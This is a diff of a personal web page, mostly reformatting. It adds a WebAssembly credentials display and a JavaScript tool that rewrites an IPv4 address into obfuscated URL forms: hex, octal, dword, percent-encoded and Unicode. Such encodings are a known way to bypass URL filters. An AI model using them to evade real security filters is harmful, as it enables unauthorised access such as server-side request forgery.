+		document.getElementById("result").innerHTML = prefix + "{" + result + "}";
+	}
+	flaginate();
+</script>
+<hr>
+<p id="username"></p>
+<p id="password"></p>
+<script type="module">
+import init, {user, pass} from "./hello_wasm.js";
+init()
+.then(() => {
+  document.getElementById("username").innerHTML =  user(4, 8, 1000)
+  document.getElementById("password").innerHTML =  pass(8, 4)
+});
+</script>
+<hr>
+<script>
+function eeeeehhhm(ip){
+const decimalv1 = 'http://' + ip
+const hexv1 = ip.split('.').reduce((acc, cur, i, arr) => {
+return acc + '0x' + parseInt(cur).toString(16) + (arr.length-1 !== i ? '.' : '')
+}, 'http://')
 
-      const hexv2 = ip.split('.').reduce((acc, cur, i, arr) => {
-        let h = parseInt(cur).toString(16)
-        if ((h.length % 2) > 0) {
-          h = "0" + h;
-        }
-        return acc + h
-      }, 'http://0x')
+const hexv2 = ip.split('.').reduce((acc, cur, i, arr) => {
+let h = parseInt(cur).toString(16)
+if ((h.length % 2) > 0) {
+  h = "0" + h;
+}
+return acc + h
+}, 'http://0x')
 
-      const hexv3 = 'http://' + hexv1.slice(7).split(".")[0] + '.0x' + hexv2.slice(11)
-      const hexv4 = 'http://' + hexv1.slice(7).slice(0, 10) + '0x' + hexv2.slice(13)
+const hexv3 = 'http://' + hexv1.slice(7).split(".")[0] + '.0x' + hexv2.slice(11)
+const hexv4 = 'http://' + hexv1.slice(7).slice(0, 10) + '0x' + hexv2.slice(13)
 
-      const octalv1 = ip.split('.').reduce((acc, cur, i, arr) => {
-        return acc + '0' + parseInt(cur).toString(8) + (arr.length-1 !== i ? '.' : '')
-      }, 'http://')
+const octalv1 = ip.split('.').reduce((acc, cur, i, arr) => {
+return acc + '0' + parseInt(cur).toString(8) + (arr.length-1 !== i ? '.' : '')
+}, 'http://')
 
-      const octalv2 = ip.split('.').reduce((acc, cur, i, arr) => {
-        return acc + '0'.repeat(Math.floor(Math.random() * 9) + 1) 
-          + parseInt(cur).toString(8) + (arr.length-1 !== i ? '.' : '')
-      }, 'http://')
+const octalv2 = ip.split('.').reduce((acc, cur, i, arr) => {
+return acc + '0'.repeat(Math.floor(Math.random() * 9) + 1) 
+  + parseInt(cur).toString(8) + (arr.length-1 !== i ? '.' : '')
+}, 'http://')
 
 
-      //const dwordv1 = 'http://' + ip.split('.').reduce((acc, cur, i, arr) => {
-      //  return (256 * acc) + parseInt(cur)
-      //}, 0)
+//const dwordv1 = 'http://' + ip.split('.').reduce((acc, cur, i, arr) => {
+//  return (256 * acc) + parseInt(cur)
+//}, 0)
 
 
-      const percentv1 = [...ip].reduce((acc, cur) => {
-        return acc + "%" + cur.charCodeAt(0).toString(16)
-      }, 'http://')
+const percentv1 = [...ip].reduce((acc, cur) => {
+return acc + "%" + cur.charCodeAt(0).toString(16)
+}, 'http://')
 
-      const mixedv1 = 'http://' + decimalv1.slice(7).split(".")[0] + '.' + hexv1.slice(7).split(".")[1] + '.' + octalv2.slice(7).split(".")[2] + '.' + hexv1.slice(7).split(".")[3]
+const mixedv1 = 'http://' + decimalv1.slice(7).split(".")[0] + '.' + hexv1.slice(7).split(".")[1] + '.' + octalv2.slice(7).split(".")[2] + '.' + hexv1.slice(7).split(".")[3]
 
-      const unicode = ip.split('.').reduce((acc, cur, i, arr) => {
-        cur.split('').forEach(n => {
-          if(n != '0'){
-            acc += String.fromCodePoint(0x245f+parseInt(n))
-          }else{
-            acc += String.fromCodePoint(0x24ea)
-         }
-        })
-        return acc+'．'
-      }, 'http://').slice(0,-1)
+const unicode = ip.split('.').reduce((acc, cur, i, arr) => {
+cur.split('').forEach(n => {
+  if(n != '0'){
+    acc += String.fromCodePoint(0x245f+parseInt(n))
+  }else{
+    acc += String.fromCodePoint(0x24ea)
+ }
+})
+return acc+'．'
+}, 'http://').slice(0,-1)
 
-      const [o1, o2, o3, o4] = ip.split('.')
-      classb = 'http://' + [o1, o2, o3 * 256 + +o4].join('.')
-      classa = 'http://' + [o1, o2*256**2 + o3 * 256 + +o4].join('.')
-      dwordv1 = 'http://' + [o1*256**3 + o2*256**2 + o3 * 256 + +o4].join('.')
+const [o1, o2, o3, o4] = ip.split('.')
+classb = 'http://' + [o1, o2, o3 * 256 + +o4].join('.')
+classa = 'http://' + [o1, o2*256**2 + o3 * 256 + +o4].join('.')
+dwordv1 = 'http://' + [o1*256**3 + o2*256**2 + o3 * 256 + +o4].join('.')
 
-      const octalv3 = "http://0" + parseInt(dwordv1.slice(7)).toString(8)
+const octalv3 = "http://0" + parseInt(dwordv1.slice(7)).toString(8)
 
-      output.innerHTML = `
-  <a href='${decimalv1}'>${decimalv1}</a>
-  <a href='${classb}'>${classb}</a>
-  <a href='${classa}'>${classa}</a>
-  <a href='${dwordv1}'>${dwordv1}</a>
-  <a href='${hexv1}'>${hexv1}</a>
-  <a href='${hexv2}'>${hexv2}</a>
-  <a href='${hexv3}'>${hexv3}</a>
-  <a href='${hexv4}'>${hexv4}</a>
-  <a href='${octalv1}'>${octalv1}</a>
-  <a href='${octalv2}'>${octalv2}</a>
-  <a href='${octalv3}'>${octalv3}</a>
-  <a href='${percentv1}'>${percentv1}</a>
-  <a href='${mixedv1}'>${mixedv1}</a>
-  <a href='${unicode}'>${unicode}</a>
+output.innerHTML = `
+<a href='${decimalv1}'>${decimalv1}</a>
+<a href='${classb}'>${classb}</a>
+<a href='${classa}'>${classa}</a>
+<a href='${dwordv1}'>${dwordv1}</a>
+<a href='${hexv1}'>${hexv1}</a>
+<a href='${hexv2}'>${hexv2}</a>
+<a href='${hexv3}'>${hexv3}</a>
+<a href='${hexv4}'>${hexv4}</a>
+<a href='${octalv1}'>${octalv1}</a>
+<a href='${octalv2}'>${octalv2}</a>
+<a href='${octalv3}'>${octalv3}</a>
+<a href='${percentv1}'>${percentv1}</a>
+<a href='${mixedv1}'>${mixedv1}</a>
+<a href='${unicode}'>${unicode}</a>
 
-            created by <a href="https://twitter.com/h43z">h43z</a>
-      `
-    }
+    created by <a href="https://twitter.com/h43z">h43z</a>
+`
+}
 
-  </script>
-    <input id='i' type='text' value='216.58.214.227' placeholder='ip here'></input><button onclick='eeeeehhhm(i.value)'>convert</button>
-    <pre id='output'></pre>
+</script>
+<input id='i' type='text' value='216.58.214.227' placeholder='ip here'></input><button onclick='eeeeehhhm(i.value)'>convert</button>
+<pre id='output'></pre>
 
-    <hr>
-    <p>
-        <a href="https://github.com/melnicek/melnicek.github.io/edit/master/index.html">edit</a>
-    </p>
-</center>
+<hr>
+<p>
+<a href="https://github.com/melnicek/melnicek.github.io/edit/master/index.html">edit</a>
+</p>
